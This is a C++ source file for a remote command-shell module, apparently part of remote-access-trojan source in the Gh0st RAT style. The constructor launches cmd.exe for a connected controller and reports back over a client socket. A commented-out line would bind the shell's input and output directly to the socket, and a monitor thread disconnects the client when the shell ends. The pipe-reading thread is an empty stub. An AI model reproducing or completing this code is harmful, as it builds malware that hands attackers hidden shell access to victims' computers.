// MyShellManager.cpp: implementation of the CMyShellManager class.
//
//////////////////////////////////////////////////////////////////////

#include "MyShellManager.h"
#include <tchar.h>

#pragma comment(lib,"msvcrt.lib")
#pragma comment(linker,"/FILEALIGN:0x200 /IGNORE:4078 /OPT:NOWIN98 /nodefaultlib:libcmt.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

void _cdecl puterr(LPCTSTR pFormat, ...)
{
	static TCHAR strBuf[1024];
	PVOID lpMsgBuf;
	
	FormatMessage( 
		FORMAT_MESSAGE_ALLOCATE_BUFFER | 
		FORMAT_MESSAGE_FROM_SYSTEM | 
		FORMAT_MESSAGE_IGNORE_INSERTS, 
		NULL, 
		GetLastError(), 
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), // Default language 
		(LPTSTR) &lpMsgBuf, 
		0, 
		NULL 
		);
		
	va_list pArg;

	va_start(pArg, pFormat);
	wvsprintf(strBuf, pFormat, pArg);
	va_end(pArg);

	MessageBoxEx(NULL,(LPTSTR)lpMsgBuf,(LPTSTR)strBuf,MB_OK,0001);
}

CMyShellManager::CMyShellManager(CClientSocket *pClient):CManager(pClient)
{    
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	GetStartupInfoW(&si);
    si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.wShowWindow=SW_NORMAL;
	//si.hStdInput=si.hStdOutput=si.hStdError= (LPVOID)pClient->m_Socket;
	
	WCHAR strShellPath[256]={0};
	
	GetSystemDirectoryW(strShellPath, 256);
	lstrcatW(strShellPath,L"\\cmd.exe");
	
	CreateProcessW(strShellPath,NULL,NULL,NULL,1,0,NULL,NULL,&si,&pi);	
    
	m_hProcessHandle = pi.hProcess;

	if(m_hProcessHandle == NULL) puterr(L"Err");
	
	BYTE	bToken = TOKEN_SHELL_START;
	Send((LPBYTE)&bToken, 1);
	WaitForDialogOpen();
	m_hThreadMonitor = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, (LPVOID)this, 0, NULL);
}

CMyShellManager::~CMyShellManager()
{
	TerminateProcess(m_hProcessHandle, 0);
	
	WaitForSingleObject(m_hThreadMonitor, 2000);
	TerminateThread(m_hThreadMonitor, 0);

    CloseHandle(m_hProcessHandle);
	CloseHandle(m_hThreadMonitor);
}

DWORD WINAPI CMyShellManager::MonitorThread(LPVOID lparam)
{	
	CMyShellManager *pThis = (CMyShellManager *)lparam;

	WaitForSingleObject(pThis->m_hProcessHandle, INFINITE);
	
	TerminateProcess(pThis->m_hProcessHandle, 1);
	
	pThis->m_pClient->Disconnect();
	return 0;
}

void CMyShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		OutputDebugString(_T("CmdShell_NotifyDialogIsOpen"));
		NotifyDialogIsOpen();
		return;
	}
	
	//if(nSize == 1 && lpBuffer[0]=='0x45') TerminateProcess(pThis->m_hProcessHandle, 1);
}

DWORD WINAPI CMyShellManager::ReadPipeThread(LPVOID lparam)
{
	
	return 0;
}
